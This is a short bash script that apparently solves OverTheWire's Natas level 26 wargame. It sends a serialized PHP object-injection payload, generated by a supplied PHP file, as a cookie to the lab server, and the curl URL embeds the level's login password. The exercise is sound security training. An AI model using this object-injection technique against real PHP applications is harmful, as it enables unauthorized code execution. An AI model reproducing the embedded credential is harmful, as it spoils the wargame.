#!/bin/bash

# Ref: http://php.net/manual/en/function.unserialize.php
#      https://www.owasp.org/index.php/PHP_Object_Injection
#

if [[ -z "$1" ]]; then
    exit 0
fi
curl http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org/index.php -b "drawing=$(php $1 2>/dev/null)"

